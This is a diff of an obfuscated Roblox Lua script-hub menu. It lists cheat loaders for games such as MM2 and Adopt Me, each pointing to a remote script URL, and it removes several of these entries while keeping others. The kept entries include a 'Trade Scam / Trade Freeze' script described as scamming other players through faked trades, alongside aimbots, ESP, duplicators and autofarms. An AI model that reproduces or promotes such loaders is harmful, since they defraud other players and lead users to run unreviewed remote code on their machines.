@@ -131,12 +131,6 @@ if tostring({}):sub(8, 15) ~= tostring({}):sub(8, 15) then
 	end
 
 	v18(v23, "Vertex (BEST - Keyless)", "The best complete MM2 script", "crosshair", "https://raw.smokingscripts.org/vertex.lua", "MM2")
-	v18(v23, "YARHM (Keyless)", "MM2 Scripts, Aimbot, Universal Scripts", "crosshair", "https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", "MM2")
-	v18(v23, "Kuni Hub (Keyless)", "ESP, Auto Farm, Character Script, Teleport & Weapon Spawner", "coins", "https://gitlab.com/rlbx-scripts/elysium/-/raw/main/mm2-visual", "MM2")
-	v18(v23, "Forge Hub (Key)", "Script Hub full of features for MM2", "zap", "https://api.luarmor.net/files/v3/loaders/d5ed1fbd4301b1d18d75153c5b47181d.lua", "MM2")
-	v18(v23, "Moon Deity (Key)", "Script Hub full of features for MM2", "eye", "https://raw.githubusercontent.com/m00ndiety/Moondiety/refs/heads/main/Loader", "MM2")
-	v18(v23, "Sorlua Hub (Key)", "Good aimbot for MM2", "zap", "https://raw.githubusercontent.com/sorlua/Projects/refs/heads/main/Roblox/loader.lua", "MM2")
-	v18(v23, "Syl Hub (Key)", "A collection of useful MM2 scripts", "zap", "https://raw.githubusercontent.com/de-ishi/syl/refs/heads/main/mainLoader", "MM2")
 	v23:Space({
 		Columns = 2
 	})
@@ -727,8 +721,6 @@ if tostring({}):sub(8, 15) ~= tostring({}):sub(8, 15) then
 	})
 	v18(v127, "(NEW) Trade Scam / Trade Freeze", "Freeze trades and scam others by faking trades (OP) — Requires good pets", "snowflake", "https://pastefy.app/BusweVMC/raw", "ADM")
 	v18(v127, "(NEW) House Cloner", "Clone houses! (NO KEY / KEYLESS)", "copy", "https://api.luarmor.net/files/v3/loaders/051b9ab9e55bc6acf1ead9319bd606ec.lua", "ADM")
-	v18(v127, "(NEW) Pet Duplicator", "Duplicate your high tier pets!", "copy", "https://pastefy.app/giyRS6Jw/raw", "ADM")	
-	v18(v127, "Rampage Hub (Key)", "Autofarm, autominigames and much more", "zap", "", "ADM")
 	v18(v127, "Ragesploit Hub (Key)", "Autofarm, autominigames and much more", "snowflake", "https://raw.githubusercontent.com/Ragesploit-x/Ragesploit/refs/heads/main/MainScript/Loader.lua", "ADM")
 
 	local v128 = v17:Tab({
